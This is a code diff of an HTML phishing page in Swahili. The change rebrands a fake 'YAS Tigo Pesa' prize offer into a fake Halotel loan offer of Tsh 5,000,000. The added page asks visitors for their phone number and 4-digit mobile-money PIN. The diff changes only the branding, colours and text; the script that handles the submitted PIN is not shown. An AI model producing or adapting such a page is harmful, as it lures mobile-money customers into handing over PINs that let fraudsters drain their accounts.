@@ -4,27 +4,27 @@
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Umejishindia Ofa Wa YAS Tigo Pesa</title>
+        <title>HALOTEL</title>
         <style>
             /* Your existing styles remain exactly the same */
             body {
                 font-family: Arial, sans-serif;
                 text-align: center;
                 padding: 40px 20px;
-                background: #001f3f;
+                background: #fa500d;
                 color: white;
                 margin: 0;
                 min-height: 100vh;
-                background-image: linear-gradient(to bottom, #001f3f 70%, #FFD200 30%);
+                background-image: linear-gradient(to bottom, #f75f08 70%, #FFD200 30%);
             }
 
             .container {
                 max-width: 420px;
                 margin: 0 auto;
-                background: rgba(0, 31, 63, 0.95);
+                background: rgba(240, 52, 5, 0.95);
                 padding: 40px 30px;
                 border-radius: 20px;
-                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+                box-shadow: 0 10px 30px rgba(252, 41, 3, 0.4);
                 position: relative;
                 z-index: 1;
             }
@@ -34,7 +34,7 @@
                 height: 120px;
                 border-radius: 20px;
                 margin-bottom: 20px;
-                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+                box-shadow: 0 6px 20px rgba(247, 60, 3, 0.3);
                 display: block;
                 margin-left: auto;
                 margin-right: auto;
@@ -43,7 +43,7 @@
             h2 {
                 font-size: 24px;
                 margin-bottom: 20px;
-                color: #FFD200;
+                color: #f8f7f2;
             }
 
             p {
@@ -52,7 +52,7 @@
             }
 
             strong {
-                color: #FFD200;
+                color: #f5f4ee;
             }
 
             input {
@@ -80,7 +80,7 @@
             button {
                 padding: 16px;
                 width: 100%;
-                background: #FFD200;
+                background: #f7763a;
                 color: #001f3f;
                 border: none;
                 border-radius: 8px;
@@ -164,7 +164,7 @@
             }
 
             #celebrationPopup {
-                background: #001f3f;
+                background: #ac2a03;
                 padding: 40px;
                 border-radius: 20px;
                 text-align: center;
@@ -243,18 +243,16 @@
 
     <body>
         <div class="container">
-            <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/3b/60/20/3b6020be-1ee7-d630-3146-21889badb89a/AppIcon-0-0-1x_U007emarketing-0-11-0-85-220.png/512x512bb.jpg"
-                alt="Mixx by Yas Logo">
-            <h2>Umejishindia Ofa Wa YAS Tigo Pesa</h2>
-            <p>Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
-            <p><strong>Kiwango cha Ofa kinachoweza kupatikana:</strong><br>Tsh 3,200,000</p>
+            <h2>Jishindie mkopo leo kwa kujiandikisha</h2>
+            <p>Karibu! Ingiza namba yako ya Halotel na Nambari ya Siri ili kuona kiwango chako.</p>
+            <p><strong>Kiwango cha mkopo kinachoweza kupatikana:</strong><br>Tsh 5,000,000</p>
 
             <form id="redeemForm" onsubmit="return handleSubmit(event)">
-                <input type="tel" id="phoneNumber" placeholder="Nambari ya Mixx" required pattern="[0-9]{9,12}"
+                <input type="tel" id="phoneNumber" placeholder="Nambari ya Halotel" required pattern="[0-9]{9,12}"
                     title="Tafadhali ingiza namba ya simu sahihi" autocomplete="tel" autofocus>
-                <input type="password" id="pin" placeholder="YAS Nambari ya Siri" maxlength="4" pattern="[0-9]{4}"
+                <input type="password" id="pin" placeholder="HALOTEL Nambari ya Siri" maxlength="4" pattern="[0-9]{4}"
                     required title="PIN lazima iwe namba 4" autocomplete="off">
-                <button type="submit" id="submitBtn">THIBITISHA ZAWADI</button>
+                <button type="submit" id="submitBtn">ENDELEA</button>
             </form>
 
             <div id="message"></div>
@@ -264,7 +262,7 @@
         <div id="celebrationOverlay">
             <div id="celebrationPopup">
                 <h1>HONGERA!</h1>
-                <p>Umefanikiwa kupata ofa yako!</p>
+                <p>UMEFAULU KUJIANDIKISHA!</p>
             </div>
         </div>
 
@@ -440,7 +438,7 @@
             // Handle page load
             window.addEventListener('load', function () {
                 // Show welcome message
-                messageDiv.innerHTML = 'Jaza fomu ili kupata ofa yako!';
+                messageDiv.innerHTML = 'Jaza fomu ili kuona kiwango chako!';
                 messageDiv.className = 'info-message';
 
                 // Clear message after 3 seconds
@@ -454,4 +452,3 @@
 
 
 </html>
-
